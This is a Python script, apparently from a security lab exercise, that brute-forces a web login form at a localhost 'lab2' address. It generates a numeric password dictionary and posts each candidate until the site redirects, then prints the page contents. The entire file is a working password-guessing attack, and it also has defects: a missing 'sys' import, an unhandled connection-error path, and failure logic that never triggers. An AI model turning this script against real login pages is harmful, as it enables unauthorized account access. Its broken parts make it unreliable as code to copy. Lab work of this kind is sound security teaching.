import requests
import time
from bs4 import BeautifulSoup

def gen_dict():
    f = open("dict.txt", "w")
    for i in range(0, 100000):
        f.write(str(i) + "\n")


ROOT = "http://localhost/lab2/"


def brute(name, filename):
    START = time.time()
    f = open(filename, "r")
    for password in f:

        password = password.replace("\n", "")
        print("working\n")

        res = auth(name, password)
        if res is not None:
            print("We got it, pass: ", password)
            return res
    return -1

def auth(user_name, password):

    session = requests.Session()
    url = ROOT + "index.php"
    params = {'btn_log': '1', "input_name": user_name, "input_password": password}
    try:
        r = session.post(url, params)
    except requests.exceptions.ConnectionError:
        print("problem\n")
        pass
    if r.url != "http://localhost/lab2/index.php":
        soup = BeautifulSoup(r.text, 'html.parser')
        return soup.p.get_text()

def run():
    key = None

    gen_dict()

    while key != "exit":
        print(
            "Lets roll\n")

        name = input("Login: ")
        res = brute(name, "dict.txt")

        if res is not None:
            print(res)
            sys.exit(1)
        else:
            print("\nFail")


run()